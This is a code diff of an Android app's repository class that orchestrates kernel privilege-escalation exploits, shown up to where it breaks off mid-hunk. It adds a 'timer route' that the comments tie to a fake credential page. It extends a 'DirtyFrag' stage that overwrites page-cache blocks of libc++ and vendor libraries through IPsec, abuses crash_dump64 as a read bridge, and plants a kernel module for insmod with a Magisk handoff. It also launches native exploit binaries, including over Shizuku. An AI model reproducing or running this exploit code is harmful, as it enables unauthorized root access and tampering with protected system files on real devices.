@@ -16,7 +16,6 @@ import androidx.core.content.edit
 import androidx.core.net.toUri
 import com.sesame.app.BuildConfig
 import com.sesame.app.BuildInfo
-import com.sesame.app.domain.model.CpuPair
 import com.sesame.app.domain.model.CrashEvidenceInfo
 import com.sesame.app.domain.model.DebugSettings
 import com.sesame.app.domain.model.ImportedEvidence
@@ -28,6 +27,7 @@ import com.sesame.app.domain.model.MeasurementMergeRow
 import com.sesame.app.domain.model.OffsetCandidate
 import com.sesame.app.data.ota.OtaPayloadExtractor
 import com.sesame.app.data.profile.PerDevicePhys
+import com.sesame.app.data.profile.Timer98260
 import com.sesame.app.domain.model.OffsetImportResult
 import com.sesame.app.domain.model.ParseResult
 import com.sesame.app.domain.model.PreflightFailure
@@ -45,6 +45,7 @@ import com.sesame.app.domain.model.VrKoMode
 import com.sesame.app.domain.repository.GhostlockRepository
 import com.sesame.app.domain.repository.ProfileConfigController
 import com.sesame.app.shizuku.ShizukuExploitRunner
+import com.sesame.app.shizuku.TimerVerdict
 import kotlinx.coroutines.CancellationException
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.runInterruptible
@@ -71,6 +72,9 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
         const val EditSessionPreferences = "ghostlock_edit_session"
         const val ExtractBinaryName = "libextract.so"
         const val NativeBinaryName = "libghostlock.so"
+        /* The timer route's generation-side analyzer (the vendored timer-extract). */
+        const val TimerExtractBinaryName = "libtimerextract.so"
+        const val TimerExtractTimeoutSeconds = 180L
 
         /* Measured database and the root phase's /proc/slabinfo capture. */
         const val MeasuredDbFileName = "measured_profiles.conf"
@@ -82,11 +86,9 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
          * short enough that a denied/ignored dialog still falls through. */
         const val CRASH_SHIZUKU_TIMEOUT_MS = 20_000L
         val AnsiEscape = Regex("\u001B\\[[0-9;]*m")
+        /** The generated document's release line, for the timer analyzer's template rule. */
+        val ReleasePattern = Regex("(?m)^release\\s*=\\s*\"([^\"]+)\"")
         const val PrefForceAttackTest = "force_attack_test"
-        /* Second way: W1-only run followed by the DirtyFrag page-cache stage. */
-        const val PrefSecondWay = "second_way"
-        /* Debug-only: force a DirtyFrag rejection for one run (fallback gate). */
-        const val PrefFallbackTest = "fallback_test"
         /** Tri-state vr.ko choices, stored as auto/on/off (legacy booleans are migrated). */
         const val PrefVrKoTagClear = "vr_ko_tag_clear"
         const val PrefVrKoSelinuxBlock = "vrko_selinux_block"
@@ -94,6 +96,9 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
         const val PrefDebugKernelLogEnabled = "debug_kernel_log_enabled"
         /** Root-manager choice (package name); absent means Auto. */
         const val PrefManagerPackage = "manager_package"
+
+        /** The boot a timer attempt last ran on; a same-boot retry is refused. */
+        const val PrefTimerAttemptBoot = "timer_attempt_boot_id"
 
         /* U01-S14: per-run KernelSU log name; the resolved path travels to
          * the native process via GHOSTLOCK_KSU_LOG. */
@@ -126,7 +131,6 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
     private val filesDir: File = appContext.filesDir
     private val preferences get() =
         appContext.getSharedPreferences("ghostlock_prefs", Context.MODE_PRIVATE)
-    private val builtinProfiles = BuiltinProfileCatalog(appContext)
     /** Ground-truth facts; written only from a completed run's root phase. */
     private val measuredProfiles = MeasuredProfileStore(File(filesDir, MeasuredDbFileName))
     private val externalProfileStore = AndroidExternalProfileStore(appContext)
@@ -135,30 +139,16 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
         externalProfileStore,
         preferences,
     )
-    private val cpuPairs = mutableListOf<CpuPair>()
-    private val cpuPairLabels = mutableListOf<String>()
-    private var selectedCpuPair = 0
     private var safeModeEnabled = false
     private var forceAttackTest = false
-    private var secondWay = false
-    /* Debug-only one-shot for the pre-W1 fallback gate; consumed by the run
-     * that reads it. Never consulted in a release build. */
-    private var fallbackTest = false
     private var vrKoTagClear = VrKoMode.AUTO
     private var vrKoSelinuxBlock = VrKoMode.AUTO
     private var shizukuEnabled = false
-    /** True once the user flipped the toggle; only then does it override the
-     * profile suggestion (PROFILE-SUGGEST-01). */
-    private var shizukuPreferenceSet = false
     private val shizukuRunner = ShizukuExploitRunner(appContext)
 
     init {
-        buildCpuPairs()
-        restoreCpuPair()
         restoreShizukuPreference()
         restoreForceAttackTest()
-        restoreSecondWay()
-        restoreFallbackTest()
         restoreVrKoTagClear()
         restoreVrKoSelinuxBlock()
         dropLegacyOffsetsCache()
@@ -174,37 +164,22 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
         /* One-time move of the pre-import-copy selection before the support
          * decision reads the copy. */
         profileController.migrateLegacyExternalSelection(release)
-        /* PROFILE-SUGGEST-01: recommend_shizuku is a suggestion. It seeds the
-         * toggle until the user makes an explicit choice, which then overrides
-         * it in both directions. */
-        val recommendShizuku = release in builtinProfiles.recommendShizuku
-        val shizukuActive = if (shizukuPreferenceSet) shizukuEnabled else recommendShizuku
+        /* Shizuku is opt-in only: the toggle is the user's, never seeded from a
+         * profile or inferred from a kernel property. */
+        val shizukuActive = shizukuEnabled
         val socName = resolveSocName()
         return KernelSnapshot(
             deviceName = resolveDeviceName(),
             kernelRelease = release,
             socName = socName,
-            cpuPairs = cpuPairs.toList(),
-            cpuPairLabels = cpuPairLabels.toList(),
-            selectedCpuPair = selectedCpuPair,
             safeModeEnabled = safeModeEnabled,
             forceAttackTest = forceAttackTest,
-            secondWay = secondWay,
             vrKoTagClear = vrKoTagClear,
             vrKoSelinuxBlock = vrKoSelinuxBlock,
-            recommendShizuku = recommendShizuku,
             shizukuEnabled = shizukuActive,
             shizukuStatus = if (shizukuActive) shizukuRunner.status()
             else com.sesame.app.domain.model.ShizukuStatus.NOT_REQUIRED,
         )
-    }
-
-    override fun selectCpuPair(index: Int) {
-        if (index !in cpuPairs.indices) return
-        selectedCpuPair = index
-        appContext.getSharedPreferences("ghostlock_prefs", Context.MODE_PRIVATE).edit {
-                putString("cpu_pair", cpuPairs[index].toString())
-            }
     }
 
     override fun setSafeModeEnabled(enabled: Boolean) {
@@ -214,16 +189,6 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
     override fun setForceAttackTest(enabled: Boolean) {
         forceAttackTest = enabled
         preferences.edit { putBoolean(PrefForceAttackTest, enabled) }
-    }
-
-    override fun setSecondWay(enabled: Boolean) {
-        secondWay = enabled
-        preferences.edit { putBoolean(PrefSecondWay, enabled) }
-    }
-
-    override fun setFallbackTest(enabled: Boolean) {
-        fallbackTest = enabled
-        preferences.edit { putBoolean(PrefFallbackTest, enabled) }
     }
 
     override fun setVrKoTagClear(mode: VrKoMode) {
@@ -238,11 +203,9 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
 
     override fun setShizukuEnabled(enabled: Boolean) {
         shizukuEnabled = enabled
-        shizukuPreferenceSet = true
         appContext.getSharedPreferences("ghostlock_prefs", Context.MODE_PRIVATE)
             .edit {
                 putBoolean("shizuku_enabled", enabled)
-                putBoolean("shizuku_explicit", true)
             }
         if (enabled) shizukuRunner.requestPermission()
     }
@@ -386,6 +349,8 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
     }.getOrDefault(false)
 
     override fun crashShellStatus(): ShizukuStatus = shizukuRunner.crashAccessStatus()
+
+    override fun shizukuShellStatus(): ShizukuStatus = shizukuRunner.status()
 
     override suspend fun generateBugreport(): ImportedEvidence? {
         if (shizukuRunner.crashAccessStatus() == ShizukuStatus.PERMISSION_REQUIRED) {
@@ -559,6 +524,9 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
                 }
             }
             val captured = mutableListOf<String>()
+            /* The optional timer block derived for this image (see
+             * docs/analysis/timer-block-generation-plan.md). */
+            var timerBlock: String? = null
             /* One generation log per extractor pass: the stderr decision lines,
              * the verdict JSON and a meta summary land in the app's crash-safe
              * run store and are exportable from the log screen. Exit 7 is a
@@ -580,6 +548,21 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
                     timeoutSeconds = 1800,
                 )
                 tee("<k> extract exit code=$exit")
+                /* The timer block is an optional overlay from a separate
+                 * analyzer on the same image; its absence or failure leaves a
+                 * native-only profile and never fails generation. */
+                if (exit == 0 && parsedFile.isFile) {
+                    val release = ReleasePattern.find(parsedFile.readText())
+                        ?.groupValues?.get(1)
+                    if (release != null) {
+                        timerBlock = deriveTimerBlock(
+                            effectiveInput,
+                            release,
+                            tee,
+                            writeSidecar,
+                        )
+                    }
+                }
                 val reportText = feasibleFile.takeIf { it.isFile }?.readText()
                 val report = reportText?.let(FeasibleReport::parse)
                 if (reportText != null) {
@@ -613,6 +596,9 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
             }
             if (code != 0 || !parsedFile.isFile) return ParseResult.Failed(code)
             val document = parsedFile.readText()
+            val generated = timerBlock?.let { block ->
+                document.trimEnd() + "\n\n" + block.trimEnd() + "\n"
+            } ?: document
             val fresh = parseEntries(document) ?: return ParseResult.Failed(code, "invalid extractor output")
             /* The document is returned, never stored: the app keeps no profile
              * documents (measured-db-plan §1). The caller probes it in memory,
@@ -633,11 +619,11 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
                 documentName = name,
                 route = report?.chosen ?: route,
                 anchor = anchorLine(captured),
-                hasAnchor = document.contains("lock_anchor_image"),
+                hasAnchor = generated.contains("lock_anchor_image"),
                 physSource = physSourceFromLines(captured),
                 physLoadPresent = resolved.any { it.getLongAt("kernel_phys_load") != null },
                 physOffsetPresent = resolved.any { it.getLongAt("kernel_phys_offset") != null },
-                documentText = document,
+                documentText = generated,
                 options = options,
             )
         } catch (error: CancellationException) {
@@ -653,15 +639,85 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
         }
     }
 
+    /**
+     * Derives the image's `timer_98260` block (the timer route's per-image
+     * constants) with the vendored timer analyzer. The block is optional
+     * metadata: any failure logs and returns null, leaving a native-only
+     * profile. It is validated here with the same parser the timer route's
+     * loader uses, so a malformed block can never reach the document.
+     */
+    private suspend fun deriveTimerBlock(
+        input: String,
+        release: String,
+        onLog: (String) -> Unit,
+        writeSidecar: (String, ByteArray) -> Boolean,
+    ): String? {
+        val binary = File(appContext.applicationInfo.nativeLibraryDir, TimerExtractBinaryName)
+        if (!binary.isFile) {
+            onLog("timer: no analyzer binary; the profile stays native-only")
+            return null
+        }
+        val out = File(filesDir, "timer-block.tmp")
+        out.delete()
+        val args = buildList {
+            add(input)
+            add("--emit-timer-conf")
+            add(out.absolutePath)
+            add("--endgame")
+            add("real,fake")
+            timerLayoutTemplate(release)?.let { template ->
+                add("--layout-template")
+                add(template)
+            }
+        }
+        onLog("timer: deriving the block from the image")
+        val exit = runCatching {
+            runProcess(
+                ProcessBuilder(listOf(binary.absolutePath) + args)
+                    .directory(filesDir)
+                    .redirectErrorStream(true)
+                    .apply {
+                        environment()["TMPDIR"] = filesDir.absolutePath
+                        environment()["HOME"] = filesDir.absolutePath
+                    },
+                onLog = onLog,
+                timeoutSeconds = TimerExtractTimeoutSeconds,
+            )
+        }.getOrElse { error ->
+            onLog("timer: analyzer error (${error.message}); the profile stays native-only")
+            out.delete()
+            return null
+        }
+        val text = out.takeIf { it.isFile }?.readText()?.trim()
+        out.delete()
+        if (exit != 0 || text.isNullOrEmpty()) {
+            onLog("timer: analyzer exited $exit; the profile stays native-only")
+            return null
+        }
+        val value = runCatching {
+            HoconSupport.parseValue(text).asValueMap()?.get(Timer98260.BLOCK_KEY)
+        }.getOrNull()
+        val (config, errors) = Timer98260.parse(value)
+        if (config == null || errors.isNotEmpty()) {
+            onLog(
+                "timer: derived block rejected " +
+                    "(${errors.firstOrNull()?.fieldPath ?: "unparsable"}); native-only profile",
+            )
+            return null
+        }
+        writeSidecar("timer-block.conf", text.toByteArray(StandardCharsets.UTF_8))
+        onLog("timer: block derived (endgames=${config.endgameLabel})")
+        return text
+    }
+
     override suspend fun probeStride(
         release: String,
         documentText: String,
-        pair: CpuPair,
         onLog: (String) -> Unit,
     ): StrideProbe? {
         /* The probe frame is the generated document, built in memory; nothing
          * is selected or stored (measured-db-plan §1). */
-        val blob = profileController.nativeDocumentFor(documentText, release, pair)
+        val blob = profileController.nativeDocumentFor(documentText, release)
             ?: return null
         val binary = File(appContext.applicationInfo.nativeLibraryDir, NativeBinaryName)
         if (!binary.isFile) return null
@@ -848,20 +904,15 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
     @Volatile
     private var preflightManager: Pair<Long, ManagerScanner.Candidate>? = null
 
-    override suspend fun preflight(pair: CpuPair, useShizuku: Boolean): PreflightResult =
+    override suspend fun preflight(useShizuku: Boolean): PreflightResult =
         withContext(Dispatchers.IO) {
-            /* The anchor state file lives under GHOSTLOCK_HOME, and the CPU pin
-             * runs in the native's process: for the Shizuku path that home is
-             * /data/local/tmp/ghostlock-app and the process is the shell's, so
-             * neither judgement is ours to make here. Both are deferred to the
-             * service (or to the class-2 pattern). */
+            /* The anchor state file lives under GHOSTLOCK_HOME: for the Shizuku
+             * path that home is /data/local/tmp/ghostlock-app and the process is
+             * the shell's, so the judgement is not ours to make here. It is
+             * deferred to the service (or to the class-2 pattern). The CPU pair
+             * is the native's own verified choice, so it has no app-side gate. */
             if (!useShizuku) {
-                anchorFailure(pair)?.let { return@withContext PreflightResult.Blocked(it) }
-                if (!CpuPairProbe.usable(pair)) {
-                    return@withContext PreflightResult.Blocked(
-                        PreflightFailure.CPU_PAIR_UNAVAILABLE,
-                    )
-                }
+                anchorFailure()?.let { return@withContext PreflightResult.Blocked(it) }
             }
             /* A scan that throws is not proof of "no manager": fail open and
              * let stageKsud report it (the class-2 pattern covers that). */
@@ -881,8 +932,8 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
      * failure, or null when a slot can be handed out (or there is no anchor to
      * check here).
      */
-    private suspend fun anchorFailure(pair: CpuPair): PreflightFailure? {
-        val config = runCatching { profileController.load(deviceRelease(), pair) }.getOrNull()
+    private suspend fun anchorFailure(): PreflightFailure? {
+        val config = runCatching { profileController.load(deviceRelease()) }.getOrNull()
             ?: return null
         val anchor = config.anchor ?: return null
         val bytes = anchor.bytes ?: AnchorSlotState.DefaultBytes
@@ -908,12 +959,83 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
 
     override suspend fun runExploit(
         config: ProfileConfig,
-        pair: CpuPair,
         onLog: (String) -> Unit,
     ): Int =
         withDebugAttackLog("direct", onLog, measure = true) { archivedLog, debugDir, runDir, writeSidecar ->
-            runExploitBinary(config, pair, "libghostlock.so", archivedLog, debugDir, runDir, writeSidecar)
+            runExploitBinary(config, "libghostlock.so", archivedLog, debugDir, runDir, writeSidecar)
         }
+
+    override fun timerProfileDocument(): String? =
+        profileController.renderTimerDocument(deviceRelease())
+
+    override suspend fun runTimerProbe(onLog: (String) -> Unit): Int = withContext(Dispatchers.IO) {
+        withDebugAttackLog("timer-probe", onLog) { archivedLog, _, _, writeSidecar ->
+            val release = deviceRelease()
+            val document = profileController.renderTimerDocument(release) ?: run {
+                archivedLog("<s> error: no timer_98260 profile for $release")
+                return@withDebugAttackLog 1
+            }
+            writeSidecar("timer-profile.json", document.toByteArray(StandardCharsets.UTF_8))
+            archivedLog(
+                "<s> timer document ${document.length}B sha256=${sha256Of(document)}",
+            )
+            shizukuRunner.runTimer(document, "probe", selectedManagerPackage(), archivedLog)
+        }
+    }
+
+    override fun timerRunAllowed(): Boolean = TimerBootContract.allowsRun(
+        preferences.getString(PrefTimerAttemptBoot, null),
+        currentBootId(),
+    )
+
+    override suspend fun runTimerRoute(onLog: (String) -> Unit): Int = withContext(Dispatchers.IO) {
+        val bootId = currentBootId()
+        val lastAttempt = preferences.getString(PrefTimerAttemptBoot, null)
+        if (!TimerBootContract.allowsRun(lastAttempt, bootId)) {
+            onLog("<s> error: a timer attempt already ran on this boot; reboot before retrying")
+            return@withContext TimerBootContract.Refused
+        }
+        /* Arm the boot at the start, not at the verdict: if the app or the
+         * UserService dies after the tool launched but before the service
+         * reports, the same-boot retry must still be refused — the tool may
+         * already be parked (a hit holds the fake cred page, a miss the
+         * failed plants). A run that never reached the tool clears it below. */
+        runCatching { preferences.edit { putString(PrefTimerAttemptBoot, bootId) } }
+        val code = withDebugAttackLog("timer", onLog) { archivedLog, _, _, writeSidecar ->
+            val release = deviceRelease()
+            val document = profileController.renderTimerDocument(release) ?: run {
+                archivedLog("<s> error: no way-2 timer_98260 profile for $release")
+                return@withDebugAttackLog TimerVerdict.NotStarted
+            }
+            writeSidecar("timer-profile.json", document.toByteArray(StandardCharsets.UTF_8))
+            /* The run log carries both: the exact runtime document the tool
+             * consumed, and the resolved profile source (the superset context
+             * — every route block, the `routes` order and the provenance). */
+            runCatching { profileController.renderResolvedForDebug(release) }
+                .getOrNull()
+                ?.let { writeSidecar("profile.conf", it.toByteArray(StandardCharsets.UTF_8)) }
+            writeSidecar(
+                "profile.meta",
+                buildString {
+                    appendLine("source=profile.conf")
+                    appendLine("runtime=timer-profile.json")
+                    appendLine("release=$release")
+                    appendLine("selected_route=${Timer98260.BLOCK_KEY}")
+                    appendLine("timer_sha256=${sha256Of(document)}")
+                }.toByteArray(StandardCharsets.UTF_8),
+            )
+            archivedLog(
+                "<s> timer document ${document.length}B sha256=${sha256Of(document)} mode=fake",
+            )
+            shizukuRunner.runTimer(document, "fake", selectedManagerPackage(), archivedLog)
+        }
+        if (code == TimerVerdict.NotStarted) {
+            /* Shizuku was not ready / the tool never launched: the boot is
+             * clean again (no parked process to hold a page or zombies). */
+            runCatching { preferences.edit { remove(PrefTimerAttemptBoot) } }
+        }
+        code
+    }
 
     override suspend fun probeDirtyfrag(): String = withContext(Dispatchers.IO) {
         val release = System.getProperty("os.version", "").orEmpty()
@@ -942,7 +1064,6 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
 
     override suspend fun runExploitWithShizuku(
         config: ProfileConfig,
-        pair: CpuPair,
         onLog: (String) -> Unit,
     ): Int {
         /* The Shizuku service runs as uid 2000 and cannot write the app's run
@@ -997,11 +1118,11 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
                         profileBlob
                     }
                     logProfileDigest(archivedLog, runtimeBlob)
-                    dumpRuntimeProfile(archivedLog, writeSidecar, release, pair, runtimeBlob)
+                    dumpRuntimeProfile(archivedLog, writeSidecar, release, runtimeBlob)
                     archivedLog("<b> starting UserService")
                     resetRunState()
                     shizukuRunner.run(
-                        pair, safeModeEnabled, forceAttackTest, profileBlob, debugDir,
+                        safeModeEnabled, forceAttackTest, profileBlob, debugDir,
                         selectedManagerPackage(), archivedLog,
                     ) { step, status ->
                         if (status == "disabled") clearRunState() else applyRunStatus(step, status)
@@ -1216,10 +1337,9 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
         log: (String) -> Unit,
         writeSidecar: (String, ByteArray) -> Boolean,
         release: String,
-        pair: CpuPair,
         blob: ByteArray?,
     ) {
-        val conf = runCatching { profileController.renderResolvedForDebug(release, pair) }.getOrNull()
+        val conf = runCatching { profileController.renderResolvedForDebug(release) }.getOrNull()
         val confWritten = conf?.let {
             writeSidecar("profile.conf", it.toByteArray(StandardCharsets.UTF_8))
         } ?: false
@@ -1239,7 +1359,105 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
      * plan (the app owns every IV), and run the native stage that patches
      * libc++, triggers init, runs the root script over the init shell and
      * restores the blocks. */
-    private suspend fun runDirtyfragStage(onLog: (String) -> Unit, debugDir: String?): Int {
+    /**
+     * The module chain's staged manager: the root script installs Magisk from
+     * this directory. Only the profile-driven pair supplies it — there is no
+     * marker file, so a W1 run never inherits a Magisk handoff. The module
+     * itself is loaded by the init stub, not by the script, so no module path
+     * is exported here (the stage reports the delivered target from its plan).
+     */
+    private fun handoffEnv(magiskBin: File?): Map<String, String> =
+        if (magiskBin == null) {
+            emptyMap()
+        } else {
+            mapOf(
+                "GHOSTLOCK_HANDOFF" to "magisk",
+                "GHOSTLOCK_MAGISK_BIN" to magiskBin.absolutePath,
+            )
+        }
+
+    /** One resolved module-chain run: the staged pair and the staged manager. */
+    private data class ModuleRun(
+        val moduleFile: File,
+        val vendorFiles: List<String>,
+        val magiskBin: File,
+    )
+
+    private val crashDumpPath = "/apex/com.android.runtime/bin/crash_dump64"
+    private val koTargets = listOf(
+        "/vendor/lib64/libbinderdebug.so",
+        "/vendor/lib64/libstagefrighthw.so",
+        "/vendor/lib64/libstagefright_aidl_bufferpool2.so",
+    )
+
+    /** One native stage invocation (aux-install or the full run). */
+    private suspend fun runStage(
+        plan: File,
+        mode: String,
+        onLog: (String) -> Unit,
+        magiskBin: File? = null,
+        /** Per-run root-script log; absent keeps the legacy shared file. */
+        ksuLog: File? = null,
+    ): Int {
+        val binary = File(appContext.applicationInfo.nativeLibraryDir, NativeBinaryName)
+        val command = ProcessBuilder(
+            binary.absolutePath,
+            "--dirtyfrag",
+            plan.absolutePath,
+            "--dirtyfrag-mode",
+            mode,
+        )
+            .directory(filesDir)
+            .redirectErrorStream(true)
+            .apply {
+                environment()["GHOSTLOCK_HOME"] = filesDir.absolutePath
+                environment()["TMPDIR"] = filesDir.absolutePath
+                environment()["HOME"] = filesDir.absolutePath
+                /* The root script and its tail must be this stage's own; the
+                 * shared default file let a failed run show a previous run's
+                 * script lines (the same-named file is appended by every
+                 * DirtyFrag stage). */
+                if (ksuLog != null) {
+                    environment()["GHOSTLOCK_KSU_LOG"] = ksuLog.absolutePath
+                }
+                environment().putAll(handoffEnv(magiskBin))
+            }
+        val code = runProcess(command, onLog = onLog, captureOutput = true, timeoutSeconds = 120L)
+        onLog("<b> second way: dirtyfrag mode=$mode exited code=$code")
+        return code
+    }
+
+    /** A bridge read of a vendor_file target, after the aux-install run put the
+     * helper into crash_dump64's page cache. The exec runs in crash_dump. */
+    private suspend fun readBridge(len: Int, path: String, onLog: (String) -> Unit): ByteArray? =
+        withContext(Dispatchers.IO) {
+            runCatching {
+                val process = ProcessBuilder(crashDumpPath, "0", path, "r", len.toString())
+                    .redirectErrorStream(false)
+                    .start()
+                val data = ByteArray(len)
+                var read = 0
+                while (read < len) {
+                    val n = process.inputStream.read(data, read, len - read)
+                    if (n <= 0) break
+                    read += n
+                }
+                process.waitFor()
+                if (read == len) data else null
+            }.onFailure {
+                onLog("<-> bridge read: ${it::class.simpleName}: ${it.message}")
+            }.getOrNull()
+        }
+
+    private suspend fun runDirtyfragStage(
+        onLog: (String) -> Unit,
+        debugDir: String?,
+        run: ModuleRun? = null,
+    ): Int {
+        /* One log per stage run: the script appends, so a shared file made a
+         * failed run read as if it had a root phase (the previous run's
+         * lines were still in it). */
+        val stageKsuLog = File(filesDir, ksuLogName(System.currentTimeMillis()))
         val ipsec = appContext.getSystemService(Context.IPSEC_SERVICE) as? IpSecManager
             ?: run {
                 onLog("<-> second way: IpSecManager unavailable")
@@ -1262,21 +1480,89 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
             val socketName = buildString {
                 repeat(8) { append(alphabet[random.nextInt(alphabet.length)]) }
             }
+            val lib = File("/system/lib64/libc++.so")
+            /* Module pipeline: the module goes into a vendor_file target through
+             * the crash_dump bridge, and the stub insmods that target. The
+             * bundled profile supplies the staged asset and the ROM vendor list;
+             * there is no marker or file fallback. The W1 pipelines keep the
+             * single direct plan (koTarget empty, no aux). */
+            val moduleMode = run != null
+            val moduleVendorCandidates =
+                run?.vendorFiles?.takeIf { it.isNotEmpty() } ?: koTargets
+            var koTarget: String? = null
+            var modulePadded: ByteArray? = null
+            var helper: ByteArray? = null
+            if (run != null) {
+                koTarget = moduleVendorCandidates.firstOrNull { File(it).exists() }
+                if (koTarget == null) {
+                    onLog("<-> second way: no vendor_file target for the module")
+                    return 1
+                }
+                helper = appContext.assets.open(DirtyfragPlan.BRIDGE_ASSET).use { it.readBytes() }
+                val raw = run.moduleFile.readBytes()
+                val len = ((raw.size + 15) / 16) * 16
+                modulePadded = ByteArray(len).also { raw.copyInto(it) }
+                val installPlan = DirtyfragPlan.build(
+                    appContext,
+                    lib,
+                    key,
+                    spiObj.spi,
+                    senderPort,
+                    encap.port,
+                    socketName,
+                    File(filesDir, "dirtyfrag.install.plan"),
+                    auxHost = File(crashDumpPath),
+                    auxHelper = helper,
+                )
+                val installCode =
+                    runStage(installPlan, "aux-install", onLog, run.magiskBin, stageKsuLog)
+                onLog("<k> second way: bridge install code=$installCode")
+                if (installCode != 0) return 1
+            }
+            var vendorEntries: List<Pair<Long, ByteArray>> = emptyList()
+            var vendorLen = 0
+            if (moduleMode) {
+                val target = koTarget!!
+                val len = modulePadded!!.size
+                val old = readBridge(len, target, onLog)
+                if (old == null) {
+                    onLog("<-> second way: bridge read of $target failed")
+                    return 1
+                }
+                vendorLen = len
+                vendorEntries = (0 until len step 16).map { off ->
+                    val current = old.copyOfRange(off, off + 16)
+                    val desired = modulePadded.copyOfRange(off, off + 16)
+                    off.toLong() to DirtyfragPlan.ivFor(key, current, desired)
+                }
+                onLog("<k> second way: module ${len} B -> $target (${vendorEntries.size} blocks)")
+            }
             val plan = DirtyfragPlan.build(
                 appContext,
-                File("/system/lib64/libc++.so"),
+                lib,
                 key,
                 spiObj.spi,
                 senderPort,
                 encap.port,
                 socketName,
                 File(filesDir, "dirtyfrag.plan"),
+                koTarget = koTarget ?: "",
+                auxHost = if (moduleMode) File(crashDumpPath) else null,
+                auxHelper = helper,
+                auxInstalled = moduleMode,
+                vendorPath = koTarget,
+                vendorLen = vendorLen,
+                vendorEntries = vendorEntries,
             )
-            onLog("<k> second way: plan ${plan.name} socket=@$socketName")
-            /* Test hook: a debug file selects the native diagnostic mode
-             * (noshell / noscript); anything else, or no file, is the product
-             * path. The root script reads the same file for "noinstrument". */
-            val modeText = runCatching { File(filesDir, "dirtyfrag.mode").readText() }.getOrDefault("")
+            onLog("<k> second way: plan ${plan.name} socket=@$socketName module=${koTarget ?: "none"}")
+            /* Debug-only diagnostic selector: a `dirtyfrag.mode` file in the
+             * app's files dir asks for noshell / noscript / laterestore. It is
+             * read in debug builds only; release always runs the product path. */
+            val modeText = if (BuildConfig.DEBUG) {
+                runCatching { File(filesDir, "dirtyfrag.mode").readText() }.getOrDefault("")
+            } else {
+                ""
+            }
             val dirtyfragMode = when {
                 modeText.contains("noshell") -> "noshell"
                 modeText.contains("noscript") -> "noscript"
@@ -1284,24 +1570,7 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
                 else -> "full"
             }
             onLog("<k> second way: mode=$dirtyfragMode")
-            val binary = File(appContext.applicationInfo.nativeLibraryDir, NativeBinaryName)
-            val command = ProcessBuilder(
-                binary.absolutePath,
-                "--dirtyfrag",
-                plan.absolutePath,
-                "--dirtyfrag-mode",
-                dirtyfragMode,
-            )
-                .directory(filesDir)
-                .redirectErrorStream(true)
-                .apply {
-                    environment()["GHOSTLOCK_HOME"] = filesDir.absolutePath
-                    environment()["TMPDIR"] = filesDir.absolutePath
-                    environment()["HOME"] = filesDir.absolutePath
-                }
-            val code = runProcess(command, onLog = onLog, captureOutput = true, timeoutSeconds = 120L)
-            onLog("<b> second way: dirtyfrag exited code=$code")
-            return code
+            return runStage(plan, dirtyfragMode, onLog, run?.magiskBin, stageKsuLog)
         } finally {
             runCatching { transform.close() }
             runCatching { spiObj.close() }
@@ -1311,7 +1580,6 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
 
     private suspend fun runExploitBinary(
         config: ProfileConfig,
-        pair: CpuPair,
         binaryName: String,
         onLog: (String) -> Unit,
         debugDir: String?,
@@ -1322,7 +1590,14 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
         return try {
             val binary = File(appContext.applicationInfo.nativeLibraryDir, binaryName)
             require(binary.isFile) { "missing native binary: ${binary.absolutePath}" }
-            if (!stageKsud(workDir, onLog)) return 1
+            /* A module-only profile hands off to Magisk, not KernelSU: its
+             * chain never runs the native W1 or the ksud late-load, so a
+             * device without a KernelSU manager is not refused. A hybrid order
+             * (module plus a W1 entry) still stages the manager. */
+            val moduleOnly = config.module != null &&
+                config.pipelineOrder.isNotEmpty() &&
+                config.pipelineOrder.all { it == "module" }
+            if (!moduleOnly && !stageKsud(workDir, onLog)) return 1
             // U01-S14: a per-run KernelSU log path so a previous run's markers
             // can never satisfy the handoff probe; passed to the native process.
             val ksuLog = File(workDir, ksuLogName(System.currentTimeMillis()))
@@ -1352,21 +1627,9 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
              * validator refuses a KDP list containing it). DirtyFrag needs the
              * ROM preflight and the primitive probe (or a matching measured-DB
              * record). No fallback after W1; a failed stage is restore/reboot. */
+            var moduleRun: ModuleRun? = null
             val pipeline = run {
-                /* Debug-only one-shot: reject DirtyFrag and resolve the two-entry
-                 * order, proving the fallback decision happens before W1. The
-                 * flag is consumed here so a later run cannot inherit it. */
-                val fallbackFault = BuildConfig.DEBUG && fallbackTest
-                if (fallbackFault) setFallbackTest(false)
                 val order = when {
-                    fallbackFault -> {
-                        onLog("<k> pipeline order=dirtyfrag,ghostlock (debug fallback test)")
-                        listOf("dirtyfrag", "ghostlock")
-                    }
-                    BuildConfig.DEBUG && secondWay -> {
-                        onLog("<k> pipeline order=dirtyfrag (debug override)")
-                        listOf("dirtyfrag")
-                    }
                     config.pipelineOrder.isEmpty() -> {
                         onLog(
                             "<k> pipeline=ghostlock (legacy default; profile has no " +
@@ -1376,49 +1639,99 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
                     }
                     else -> config.pipelineOrder
                 }
+                /* The DirtyFrag box: off trims the profile's ordered pipeline
+                 * to GhostLock for this run; the profile keeps the capability. */
